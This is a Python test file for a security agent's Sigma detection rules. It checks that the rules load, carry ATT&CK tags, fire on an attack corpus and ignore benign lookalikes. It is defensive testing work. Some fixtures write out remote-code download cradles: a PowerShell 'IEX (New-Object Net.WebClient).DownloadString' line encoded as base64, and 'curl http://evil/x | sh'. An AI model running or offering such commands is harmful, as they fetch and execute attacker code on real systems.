"""The rules that ship with the agent, measured against the corpus.

`conf/sigma/` used to be empty on purpose - the argument being that a
detection nobody reviewed is not an improvement. The argument was fine and the
outcome was not: ATT&CK coverage was zero on every install, the coverage page
had nothing to draw, and "no rules installed" is not a defensible default for
a product whose job is detection.

So a baseline ships, and it earns its place here rather than by existing. The
test that matters is not that the rules parse - it is that they fire on real
attacks and stay quiet on the hard negatives, because a rule that loads and
never matches is indistinguishable from a rule nobody wrote.
"""
from __future__ import annotations

import base64
import json
import pathlib
import re

import pytest

from core import sigma
from core.sigma_loader import (SYSMON_FIELDS, WINDOWS_FIELDS, load_dir,
                               match_all, text_event_fields,
                               windows_event_fields)

ROOT = pathlib.Path(__file__).resolve().parent.parent
RULES_DIR = ROOT / "Sentora" / "conf" / "sigma"
CORPUS = ROOT / "evals" / "corpus_attacks.jsonl"


@pytest.fixture(scope="module")
def loaded():
    return load_dir(RULES_DIR)


# --------------------------------------------------------------------------
# They load
# --------------------------------------------------------------------------

def test_rules_ship_with_the_agent(loaded):
    """An empty rules directory means zero ATT&CK coverage on every install,
    and a coverage page that is empty for a reason nobody can see."""
    assert loaded.rules, "no Sigma rules ship - ATT&CK coverage would be zero"


def test_every_shipped_rule_compiles(loaded):
    """These are ours. A community rule failing to load is the operator's to
    resolve; one of ours failing is a bug we shipped."""
    assert loaded.rejected == []


def test_every_rule_carries_a_technique(loaded):
    """The ATT&CK coverage page reads the tags. A rule without one detects
    something and contributes nothing to the picture of what is covered."""
    untagged = [r.title for r in loaded.rules if not r.techniques]
    assert untagged == []


def test_every_rule_records_what_would_falsely_trigger_it(loaded):
    """An analyst dismissing an alert needs to know what benign thing looks
    like this. Writing it down at authoring time is the only moment anybody
    actually knows."""
    missing = [r.title for r in loaded.rules if not getattr(r, "falsepositives", None)]
    assert missing == [], f"no falsepositives recorded: {missing}"


# --------------------------------------------------------------------------
# They fire
# --------------------------------------------------------------------------

CORPUS_FIELDS = {
    "CommandLine": "CommandLine", "ParentImage": "ParentProcessName",
    "ImagePath": "ImagePath", "Command": "TaskContent", "TaskName": "TaskName",
    "TargetObject": "TargetObject", "Details": "Details",
    "ServiceName": "ServiceName", "IpAddress": "IpAddress",
}


def _corpus():
    return [json.loads(line) for line
            in CORPUS.read_text(encoding="utf-8").splitlines() if line.strip()]


def _message(case):
    raw = case["event"].get("message") or ""
    try:
        return json.loads(raw).get("message") or raw
    except (ValueError, TypeError):
        return raw


def _as_event(text: str) -> dict:
    """Put back the named fields the corpus flattened into one line.

    The corpus stores what an analyst would read. The agent supplies
    StringInserts, so replaying it faithfully means reversing that.
    """
    eid = int((re.search(r"EID=(\d+)", text) or [0, "0"])[1] or 0)
    channel = (re.search(r"^\[(\w+)]", text) or ["", ""])[1]
    if channel == "Sysmon":
        channel = "Microsoft-Windows-Sysmon/Operational"

    table = SYSMON_FIELDS if "sysmon" in channel.lower() else WINDOWS_FIELDS
    names = table.get(eid, [])
    inserts = [""] * len(names)
    for corpus_name, schema_name in CORPUS_FIELDS.items():
        found = re.search(re.escape(corpus_name) + r"=([^|]*)", text)
        if found and schema_name in names:
            inserts[names.index(schema_name)] = found.group(1).strip()
    if eid == 4104 and "ScriptBlockText" in names:
        parts = text.split("ScriptBlock |", 1)
        if len(parts) == 2:
            inserts[names.index("ScriptBlockText")] = parts[1].strip()
    return windows_event_fields(eid, inserts, message=text, channel=channel)


# Password spray is the deliberate exception. It is a shape across several
# events - one password, many accounts, one source - and stateless Sigma has
# no way to express it. Named here rather than left as an unexplained failure.
NEEDS_CORRELATION = {"constructed:t1110-password-spray"}


@pytest.mark.parametrize("case", [
    c for c in _corpus() if c["expected"] in ("CRITICAL", "SUSPICIOUS")
], ids=lambda c: c["id"])
def test_attacks_are_caught_by_sigma_alone(case, loaded):
    """Without the AI and without the regex list. Sigma is the deterministic
    layer, and the layer that still works when the model is unavailable."""
    if case["id"] in NEEDS_CORRELATION:
        pytest.skip("requires correlation across events, which Sigma cannot express")
    hits = match_all(loaded.rules, _as_event(_message(case)))
    assert hits, f"no shipped rule fires on {case['id']}"


@pytest.mark.parametrize("case", [
    c for c in _corpus() if c["expected"] == "NOT_CRITICAL"
], ids=lambda c: c["id"])
def test_hard_negatives_stay_quiet(case, loaded):
    """These are chosen to look like the attacks: a service from a remote
    share, hidden no-profile PowerShell, base64 on a command line. A baseline
    that fires on them costs more attention than it saves."""
    hits = match_all(loaded.rules, _as_event(_message(case)))
    assert not hits, f"{case['id']} falsely matched {[h.title for h in hits]}"


def test_the_text_only_path_is_honest_about_what_it_cannot_do(loaded):
    """A syslog line has no CommandLine, so the Windows rules cannot fire on
    it. Worth pinning: the failure to match here is a property of text logs,
    not a broken rule, and the distinction should not quietly reverse."""
    for case in _corpus():
        fields = text_event_fields(_message(case), "corpus")
        assert set(fields) <= {"Message", "LogFile", "SourceIp", "User"}


# --------------------------------------------------------------------------
# Field mapping
# --------------------------------------------------------------------------

def test_sysmon_ids_are_not_read_on_other_channels():
    """Sysmon's EventID 1 is a process creation. EventID 1 on the System
    channel is not, and reading it through Sysmon's layout would put arbitrary
    text into `Image` and `CommandLine` - inventing evidence for whichever
    rule happened to match it."""
    system = windows_event_fields(1, ["a", "b", "c"], channel="System")
    assert "Image" not in system
    assert "CommandLine" not in system

    sysmon = windows_event_fields(
        1, ["rule", "t", "guid", "404", "C:\\x.exe"],
        channel="Microsoft-Windows-Sysmon/Operational")
    assert sysmon["Image"] == "C:\\x.exe"


def test_a_script_block_is_addressable_as_a_command_line():
    """4104 and 4688 answer the same question - what was run - and an estate
    with script block logging on may never see the process event at all."""
    fields = windows_event_fields(4104, ["powershell -enc AAA", "C:\\s.ps1"],
                                  channel="Microsoft-Windows-PowerShell/Operational")
    assert fields["CommandLine"] == "powershell -enc AAA"


def test_a_journal_entry_keeps_its_own_names_and_gains_sigma_ones():
    from core.sigma_loader import journal_event_fields
    fields = journal_event_fields({"_COMM": "sshd", "MESSAGE": b"accepted",
                                   "_CMDLINE": "/usr/sbin/sshd -D"})
    assert fields["Image"] == "sshd"
    assert fields["_COMM"] == "sshd"
    assert fields["CommandLine"] == "/usr/sbin/sshd -D"
    assert fields["Message"] == "accepted"


# --------------------------------------------------------------------------
# The modifiers those rules depend on
# --------------------------------------------------------------------------

def _rule(detection: str):
    return sigma.parse(
        "title: t\nlogsource: {product: windows}\ndetection:\n" + detection, "t")


@pytest.mark.parametrize("shift", range(6))
def test_utf16_base64offset_finds_a_needle_at_every_alignment(shift):
    """PowerShell's -EncodedCommand takes UTF-16LE. A needle encoded as UTF-8
    and base64'd cannot appear in that payload at all, so without this the
    detection does not fire - and nothing says why.

    The shift is what makes this a real test: base64 packs three bytes into
    four characters, so the encoding of a substring depends on where it starts
    and where it ends. All six offsets have to match or the rule fires only
    on payloads that happen to be aligned.
    """
    rule = _rule("    sel:\n        CommandLine|utf16le|base64offset|contains: 'Net.WebClient'\n"
                 "    condition: sel\n")
    script = "x" * shift + "IEX (New-Object Net.WebClient).DownloadString('http://h/a')"
    payload = base64.b64encode(script.encode("utf-16-le")).decode()
    assert rule.matches({"CommandLine": "powershell -nop -enc " + payload})


def test_utf16_base64offset_does_not_match_an_unrelated_payload():
    rule = _rule("    sel:\n        CommandLine|utf16le|base64offset|contains: 'Net.WebClient'\n"
                 "    condition: sel\n")
    payload = base64.b64encode("Get-Date; Write-Host hi".encode("utf-16-le")).decode()
    assert not rule.matches({"CommandLine": "powershell -enc " + payload})


@pytest.mark.parametrize("shift", range(6))
def test_plain_base64offset_still_works(shift):
    """UTF-8 is the default and the Linux case; adding an encoding step must
    not have broken it."""
    rule = _rule("    sel:\n        Message|base64offset|contains: 'curl http'\n"
                 "    condition: sel\n")
    blob = base64.b64encode(("y" * shift + "curl http://evil/x | sh").encode()).decode()
    assert rule.matches({"Message": blob})


def test_an_encoding_modifier_alone_is_rejected_not_silently_useless():
    """On its own it would compare UTF-16 bytes against a str and never be
    equal - a rule that loads, reports as covered, and detects nothing. The
    loudest possible failure is the right one here."""
    with pytest.raises(sigma.UnsupportedRule):
        _rule("    sel:\n        CommandLine|utf16le|contains: 'x'\n    condition: sel\n")


def test_a_developer_encoding_a_config_is_not_an_encoded_cradle(loaded):
    """The distinction the base64 matching exists to make. Both are base64 on
    a PowerShell command line; only one of them is fetching remote code."""
    benign = windows_event_fields(
        4104, ["[Convert]::FromBase64String($env:APP_CONFIG)", "C:\\dev"],
        channel="Microsoft-Windows-PowerShell/Operational")
    assert not match_all(loaded.rules, benign)
